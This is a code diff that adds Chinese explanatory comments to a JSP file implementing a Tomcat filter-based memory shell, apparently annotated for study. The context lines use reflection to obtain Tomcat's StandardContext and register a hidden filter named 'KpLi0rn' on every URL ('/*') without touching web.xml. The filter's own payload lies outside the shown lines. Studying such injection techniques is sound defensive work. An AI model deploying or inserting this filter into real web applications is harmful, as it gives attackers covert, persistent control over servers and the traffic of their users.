@@ -12,6 +12,7 @@
 
 <%
      final String name = "KpLi0rn";
+     // 获取的是Servlet容器对象
      ServletContext servletContext = request.getSession().getServletContext();
 
      Field appctx = servletContext.getClass().getDeclaredField("context");
@@ -26,6 +27,7 @@
      Configs.setAccessible(true);
      Map filterConfigs = (Map) Configs.get(standardContext);
 
+     // 如果未加载此filter
      if (filterConfigs.get(name) == null){
           Filter filter = new Filter() {
                @Override
@@ -54,7 +56,7 @@
 
           };
 
-
+          // 初始化 filterDef
           FilterDef filterDef = new FilterDef();
           filterDef.setFilter(filter);
           filterDef.setFilterName(name);
@@ -64,6 +66,7 @@
            */
           standardContext.addFilterDef(filterDef);
 
+          // 初始化 filterMap
           FilterMap filterMap = new FilterMap();
           filterMap.addURLPattern("/*");
           filterMap.setFilterName(name);
@@ -71,6 +74,7 @@
 
           standardContext.addFilterMapBefore(filterMap);
 
+          // 添加到web.xml
           Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
           constructor.setAccessible(true);
           ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
